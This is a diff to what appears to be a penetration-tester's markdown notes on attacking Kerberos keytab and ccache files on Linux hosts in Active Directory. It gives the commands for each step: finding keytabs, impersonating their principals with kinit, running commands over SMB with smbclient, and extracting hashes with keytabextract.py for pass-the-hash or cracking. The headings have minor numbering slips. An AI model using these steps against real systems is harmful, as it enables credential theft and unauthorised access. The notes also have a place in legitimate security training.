@@ -34,7 +34,7 @@ find / -name *keytab* -ls 2>/dev/null
 ##### identifying `keytab` in `cronjobs`
 
 ```bash
-cronjob -l
+crontab -l
 ```
 
 
@@ -52,18 +52,18 @@ env | grep -i krb5
 ls -la /tmp
 ```
 
-#### STEP 2 : Exploiting 
+#### STEP 2 : Exploiting `KEYTAB` 
 
 - If we found a legit `keytab` we can use its contents or credentials inside to impersonate as another user. We can use `kinit` tool for this but we also need to know for which user that `keytab` file was created for 
 
 
-##### Listing the `keytab` file information
+##### a) Listing the `keytab` file information
 
 ```bash
 klist -k -t <keytab_file_path>
 ```
 
-##### Impersonation using `keytab` info
+##### b) Impersonation using `keytab` info
 
 - `PRINCIPAL_NAME` is the user account's name in the Kerberos realm or the Active Directory network.
 - Also provide the `keytab` file path of that respective user only not any other random `keytab` file paths.
@@ -73,7 +73,7 @@ klist -k -t <keytab_file_path>
 kinit <PRINCIPAL_NAME> -k -t <keytab_file_path>
 ```
 
-##### Connecting to SMB Client 
+##### c) Connecting to SMB Client 
 
 - `-k` used to authenticate to the SMB client network using the Kerberos ticket.
 - `-c` used to execute a command upon login and exit. This is one shot, that's why we use the switch.
@@ -81,6 +81,72 @@ kinit <PRINCIPAL_NAME> -k -t <keytab_file_path>
 ```bash
 smbclient <NETWORK_SHARE> -c <COMMAND_TO_EXECUTE_UPON_LOGIN> # this command is one time
 ```
+
+##### d) Extracting `keytab` hashes using `keyTabExtract`
+
+- We can use the `keyTabExtract.py` tool to extract hashes from the `keytab` file and if we get `NTLM`, `AES256` or `AES128` related hashes, we can use them to perform **Pass the Hash** attacks.
+- **Note:** A `KeyTab` file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
+- For cracking the hash we can use `hashcat` or `john`.
+
+```bash
+python3 /opt/keyextract.py <keytab_filepath>
+```
+
+
+#### STEP 2 : Exploiting `KEYTAB CCACHE`
+
+- To abuse `ccache` files, we need to have read privileges on that particular `keytab ccache` file. These files, located `/tmp` directory but we could read them if we get `root` access.
+
+
+##### a) Looking for `ccache` files
+
+- Will list the domain users. Must require read permissions or be higher privileged user to read the `/tmp` details.
+
+```bash
+ls -la /tmp
+```
+
+##### b) Identifying the group membership 
+
+```bash
+id <user>
+```
+
+##### c) Impersonation of an user with a `Keytab`
+
+- `PRINCIPAL_NAME` is the user account's name in the Kerberos realm or the Active Directory network.
+- Also provide the `keytab` file path of that respective user only not any other random `keytab` file paths.
+- If the impersonation was successful, we would be able to access files/folders privileged or accessible by the user we just impersonated
+
+```bash
+klist # list the active Kerberos ticket cache
+kinit <PRINCIPAL_NAME> -k -t <keytab_filepath>
+```
+
+##### c) Connecting to SMB Share
+
+- `-k` used to authenticate to the SMB client network using the Kerberos ticket.
+- `-c` used to execute a command upon login and exit. This is one shot, that's why we use the switch.
+
+```bash
+smbclient <NETWORK_SHARE> -k -c <COMMAND_TO_EXECUTE> # this command is executed one time
+```
+
+---
+## `Keytab` Extraction
+
+
+### Extracting `keytab` using `keyTabExtract`
+
+- You might get hashes so you can use them to perform **Pass the Hash** attacks or you can crack them offline using cracking tools like `hashcat` or `john`.
+- **Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
+
+```bash
+python3 /opt/keytabextract.py <keytab_filepath>
+```
+
+
+
 
 
 
